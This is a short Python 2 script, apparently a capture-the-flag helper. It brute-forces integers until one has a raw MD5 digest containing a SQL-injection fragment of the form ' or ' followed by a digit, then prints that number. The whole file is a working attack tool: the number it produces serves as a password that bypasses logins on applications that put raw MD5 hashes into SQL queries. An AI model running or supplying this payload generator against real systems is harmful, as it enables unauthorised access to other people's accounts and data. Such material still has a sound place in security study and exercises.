import hashlib
import re


def gethash():

    sqlpattern = ".*'((or)|([|][|]))'[1-9]"

    # hard coded to save running time
    i = 129581926211651571912466741651878684111

    while True:
        # if(not i % 10000):
        #     print "i is = " + str(i)
        s = str(i)

        m = hashlib.md5()
        m.update(s)

        # search pattern ignoring case
        if re.search(sqlpattern, str(m.digest()), re.I):
            print s
            break

        i = i + 1


if __name__=='__main__':
    gethash()
